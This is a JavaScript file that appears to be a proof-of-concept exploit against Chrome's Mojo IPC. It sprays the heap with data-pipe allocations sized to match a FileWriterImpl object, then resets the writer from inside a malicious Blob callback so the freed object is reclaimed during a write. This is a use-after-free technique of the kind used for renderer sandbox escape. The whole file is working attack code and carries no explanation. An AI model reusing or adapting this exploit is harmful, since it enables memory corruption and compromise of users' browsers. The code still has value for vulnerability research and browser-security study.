let blob_registry_ptr = new blink.mojom.BlobRegistryPtr();
Mojo.bindInterface(blink.mojom.BlobRegistry.name,
                   mojo.makeRequest(blob_registry_ptr).handle, "process");

let file_system_manager_ptr = new blink.mojom.FileSystemManagerPtr();
Mojo.bindInterface(blink.mojom.FileSystemManager.name,
                 mojo.makeRequest(file_system_manager_ptr).handle, "process");

async function Blob0() {
  function BytesProviderImpl() {
    this.binding = new mojo.Binding(blink.mojom.BytesProvider, this);
  }

  let bytes_provider = new BytesProviderImpl();
  let bytes_provider_ptr = new blink.mojom.BytesProviderPtr();
  bytes_provider.binding.bind(mojo.makeRequest(bytes_provider_ptr));

  let blob_ptr = new blink.mojom.BlobPtr();
  let blob_req = mojo.makeRequest(blob_ptr);

  let data_element = new blink.mojom.DataElement();
  data_element.bytes = new blink.mojom.DataElementBytes();
  data_element.bytes.length = 1;
  data_element.bytes.embeddedData = [0];
  data_element.bytes.data = bytes_provider_ptr;

  await blob_registry_ptr.register(blob_req, 'blob_0', "text/html", "", [data_element]);
}

function Allocation(size=280) {
  function ProgressClient() {
    function ProgressClientImpl() {
    }

    ProgressClientImpl.prototype = {
      onProgress: async (arg0) => {
      }
    };

    var progress_client_ptr = new mojo.AssociatedInterfacePtrInfo();
    var progress_client_req = mojo.makeRequest(progress_client_ptr);
    var progress_client_binding = new mojo.AssociatedBinding(
      blink.mojom.ProgressClient, new ProgressClientImpl(), progress_client_req);

    return progress_client_ptr;
  }

  this.pipe = Mojo.createDataPipe({elementNumBytes: size, capacityNumBytes: size});
  this.serialized_blob = blob_registry_ptr.registerFromStream("", "", size, this.pipe.consumer, ProgressClient());

  this.malloc = function(data) {
    this.pipe.producer.writeData(data);
  }

  this.free = function() {
    this.pipe.producer.close();
  }

  return this;
}

async function file_writer(oob) {
  const kFileWriterImplSize = 0x140;
  const kAllocationCount = 0x8000;

  let data = new Uint8Array(kFileWriterImplSize).fill(0x23).buffer;

  let heap = new Array(kAllocationCount);
  for (var i = 0; i < kAllocationCount; ++i) {
    heap[i] = new Allocation(kFileWriterImplSize);
  }

  let host_url = new url.mojom.Url();
  host_url.url = window.location.href;

  let open_result = await file_system_manager_ptr.open(host_url, 0);

  let file_url = new url.mojom.Url();
  file_url.url = open_result.rootUrl.url + '/aaaa';

  var create_writer_result = await file_system_manager_ptr.createWriter(file_url);

  function Blob0Impl() {
    this.binding = new mojo.Binding(blink.mojom.Blob, this);
  }

  Blob0Impl.prototype = {
    getInternalUUID: async (arg0) => {
      print('  [*] getInternalUUID');

      create_writer_result.writer.ptr.reset();

      for (var i = 0; i < kAllocationCount; ++i) {
        heap[i].malloc(data);
      }

      Blob0();

      print('  [*] FileWriterImpl::DoWrite');
      return {'uuid': 'blob_0'};
    }
  };

  let blob_impl = new Blob0Impl();
  let blob_impl_ptr = new blink.mojom.BlobPtr();
  blob_impl.binding.bind(mojo.makeRequest(blob_impl_ptr));
  create_writer_result.writer.write(0, blob_impl_ptr);
}
